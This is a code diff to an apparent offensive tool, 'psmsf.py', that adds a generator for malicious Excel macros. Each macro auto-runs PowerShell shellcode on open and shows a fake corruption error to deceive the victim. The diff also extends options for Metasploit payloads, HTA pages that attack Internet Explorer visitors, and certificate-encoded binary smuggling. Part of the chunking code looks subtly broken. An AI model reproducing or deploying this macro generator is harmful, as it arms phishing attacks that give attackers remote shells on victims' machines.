@@ -212,6 +212,33 @@ def generate_hta_attack(command):
     return hta_index_code, hta_module_code
 
 
+def generate_macro_attack(shellcode, line_length=300):
+    data = ""
+    cmd_list = [shellcode[i: i+line_length] for i in range(0, len(shellcode), line_length)]
+    for line in cmd_list:
+        data += "& \"" + line + "\" _\n"
+
+    data = data[:4]
+    data = data.replace("&", "", 1)
+
+    macro = ("Sub Auto_Open()\n"
+             "Dim x\n"
+             "x = \"%s\"\n"
+             "Shell (\"POWERSHELL.EXE \" & x)\n"
+             "Dim title As String\n"
+             "title = \"Critical Microsoft Office Error\"\n"
+             "Dim msg As String\n"
+             "Dim intResponse As Integer\n"
+             "msg = \"This document appears to be corrupt or missing critical "
+             "rows in order to restore. Please restore this file from a backup.\"\n"
+             "intResponse = MsgBox(msg, 16, title)\n"
+             "Application.Quit\n"
+             "End Sub" % shellcode)
+
+    logging.info("\n%s" % macro)
+    return macro
+
+
 def powershell_attack_help():
     doc = ("Everything is now generated in two files, ex:\n"
            "    powershell_hacking.bat - shellcode can be executed in cmd console.\n"
@@ -244,6 +271,17 @@ def hta_attack_help():
     logging.info("python psmsf.py --attacktype hta whoami")
 
 
+def macro_attack_help():
+    doc = ("The Macro attack will automatically generate a new macro, and call it\n"
+           "Auto_Open and paste the generated code into that. This will automatically"
+           "run. Note that a message will prompt to the user saying that the file is "
+           "corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR!"
+           "This is tricking the victim to thinking the excel document is corrupted."
+           "You should get a shell through powershell injection after that."
+    )
+    logging.info(doc)
+    logging.info("python psmsf.py --attacktype hta whoami")
+
 def banner():
     banner = """
      ######
@@ -264,19 +302,19 @@ def help():
     parser = OptionParser(usage=usage)
 
     try:
-        parser.add_option('--attacktype', dest='attacktype', help='Attack Types are supported. (ps, hta, crt)')
+        parser.add_option('--attacktype', dest='attacktype', help='Attack Types are supported. (ps, crt, hta, mac)')
 
-        powershell_opts = OptionGroup(parser, "Powershell Attack", "Powershell features")
+        powershell_opts = OptionGroup(parser, "Powershell/Macro Attack", "Generate metasploit console script / macro")
         powershell_opts.add_option('--payload', dest='payload', type='str', help='payload of metasploit framework')
         powershell_opts.add_option('--lhost', dest='lhost', type='str', help='lhost for payload of metasploit framework')
         powershell_opts.add_option('--lport', dest='lport', type='int', help='lport for payload of metasploit framework')
         parser.add_option_group(powershell_opts)
 
-        crt_opts = OptionGroup(parser, "CERT Attack", "Cert features")
+        crt_opts = OptionGroup(parser, "CERT Attack", "Translate a binary file into a text certification file, and restore the cert file to a binary file on target machines")
         crt_opts.add_option('--filename', dest='filename', type='str', help='file to be encoded to a certification')
         parser.add_option_group(crt_opts)
 
-        hta_opts = OptionGroup(parser, "HTA Attack", "HTA features")
+        hta_opts = OptionGroup(parser, "HTA Attack", "Generate HTA html page. When victims access HTA page, os will be attacked from Internet Explorer")
         hta_opts.add_option('--command', dest='command', type='str', help='command of attack mode')
         parser.add_option_group(hta_opts)
 
@@ -299,6 +337,14 @@ if __name__ == "__main__":
     if attacktype == 'ps':
         if args.payload and args.lhost and args.lport:
             generate_powershell_attack(args.payload, args.lhost, args.lport)
+        else:
+            banner()
+            powershell_attack_help()
+
+    elif attacktype == 'mac':
+        if args.payload and args.lhost and args.lport:
+            powershell_cmd, msfcommand = generate_powershell_attack(args.payload, args.lhost, args.lport)
+            generate_macro_attack(powershell_cmd)
         else:
             banner()
             powershell_attack_help()
